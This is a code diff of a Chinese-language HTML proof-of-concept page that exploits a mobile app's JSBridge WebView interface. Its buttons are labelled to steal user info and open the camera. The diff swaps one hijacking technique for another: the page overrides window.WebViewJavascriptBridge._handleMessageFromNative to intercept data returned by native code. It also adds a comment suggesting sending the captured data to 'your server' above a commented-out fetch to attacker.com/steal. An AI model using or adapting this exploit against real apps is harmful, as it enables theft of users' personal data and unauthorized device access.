@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JSBridge 漏洞利用 PoC (终极版)</title>
+    <title>JSBridge 漏洞利用 PoC (胜利版)</title>
     <style>
         body { font-family: sans-serif; padding: 20px; max-width: 600px; }
-        button { display: block; width: 100%; padding: 12px; margin: 8px 0; font-size: 16px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 4px; }
-        button:hover { background-color: #0056b3; }
+        button { display: block; width: 100%; padding: 12px; margin: 8px 0; font-size: 16px; cursor: pointer; background-color: #28a745; color: white; border: none; border-radius: 4px; }
+        button:hover { background-color: #218838; }
         #log { margin-top: 20px; padding: 10px; background: #f0f0f0; border-radius: 4px; white-space: pre-wrap; font-family: monospace; }
         .success { color: #28a745; }
         .error { color: #dc3545; }
@@ -15,7 +15,7 @@
     <script src="https://unpkg.com/vconsole@latest/dist/vconsole.min.js"></script>
 </head>
 <body>
-    <h1>JSBridge 漏洞利用 PoC</h1>
+    <h1>🎉 JSBridge 漏洞利用 PoC (胜利版) 🎉</h1>
     <button onclick="testGetUserInfo()">窃取用户信息</button>
     <button onclick="testOpenCamera()">打开相机</button>
     <button onclick="clearLog()">清空日志</button>
@@ -40,16 +40,14 @@
 
         // 【核心】定义全局回调函数，用于接收原生返回的数据
         function nativeCallback(data) {
-            console.log(">>> [vConsole] nativeCallback 回调被触发! <<<");
-            console.log(">>> [vConsole] 收到的原始数据:", data);
-
-            log('--- nativeCallback 回调触发 ---');
+            log('--- nativeCallback 真正的处理函数被调用 ---');
             log(`🎉 收到数据: ${data}`, 'success');
             
             try {
                 const result = JSON.parse(data);
                 if (result.code === "0") {
                     log(`✅ 操作成功，数据: ${JSON.stringify(result.data)}`, 'success');
+                    // 在这里可以将数据发送到你的服务器
                     // fetch('https://attacker.com/steal', { method: 'POST', body: JSON.stringify(result.data) });
                 } else {
                     log(`❌ 操作失败，原因: ${result.message}`, 'error');
@@ -59,26 +57,38 @@
             }
         }
 
-        // 【核心解决方案】创建一个“伪装者”，来拦截 XFB 风格的回调
-        // 根据反编译代码，XFB 回调通过 window.$C2H_JSBridge 执行
-        window.$C2H_JSBridge = function(cbID, data) {
-            console.log(">>> [vConsole] $C2H_JSBridge 伪装者被触发! <<<");
-            console.log(">>> [vConsole] cbID:", cbID);
-            console.log(">>> [vConsole] data:", data);
+        // 【核心解决方案】创建一个“拦截者”，来接管 App 的回调
+        // 根据 BridgeUtil，App 会调用 window.WebViewJavascriptBridge._handleMessageFromNative
+        if (window.WebViewJavascriptBridge) {
+             log('⚠️ window.WebViewJavascriptBridge 已存在，正在覆盖...', 'error');
+        }
+        
+        window.WebViewJavascriptBridge = {
+            _handleMessageFromNative: function(jsonStr) {
+                console.log(">>> [vConsole] _handleMessageFromNative 拦截者被触发! <<<");
+                console.log(">>> [vConsole] 收到的原始 JSON:", jsonStr);
 
-            log(`--- $C2C_JSBridge 伪装者被触发 ---`);
-            log(`拦截到 cbID: ${cbID}, 数据: ${data}`);
-            
-            // 因为我们调用 jsCallNative 时传的 cbID 是 'nativeCallback'
-            // 所以这里 cbID 的值就是 'nativeCallback'
-            // 我们直接调用我们真正的处理函数
-            if (cbID === 'nativeCallback') {
-                nativeCallback(data);
-            } else {
-                log(`收到未知 cbID: ${cbID}`, 'error');
+                log('--- _handleMessageFromNative 拦截者被触发 ---');
+                log(`拦截到原始数据: ${jsonStr}`);
+                
+                try {
+                    const message = JSON.parse(jsonStr);
+                    const callbackId = message.responseId; // 这会是 'nativeCallback'
+                    const resultData = message.responseData; // 这会是 {"code":"0", ...}
+                    
+                    log(`解析成功，cbID: ${callbackId}, 数据: ${resultData}`);
+
+                    // 根据 cbID 调用我们真正的处理函数
+                    if (callbackId === 'nativeCallback') {
+                        nativeCallback(resultData);
+                    } else {
+                        log(`收到未知 cbID: ${callbackId}`, 'error');
+                    }
+                } catch (e) {
+                    log(`解析 JSON 失败: ${e.message}`, 'error');
+                }
             }
         };
-
 
         // 【核心】使用 jsCallNative 方法进行调用
         function callPlugin(pluginName, params) {
@@ -117,7 +127,7 @@
         // 页面加载时自动扫描
         window.onload = () => {
             log('页面加载完成，点击按钮开始测试');
-            log('已创建 $C2H_JSBridge 伪装者，准备拦截回调...');
+            log('已创建 _handleMessageFromNative 拦截者，准备拦截回调...');
         };
     </script>
 </body>
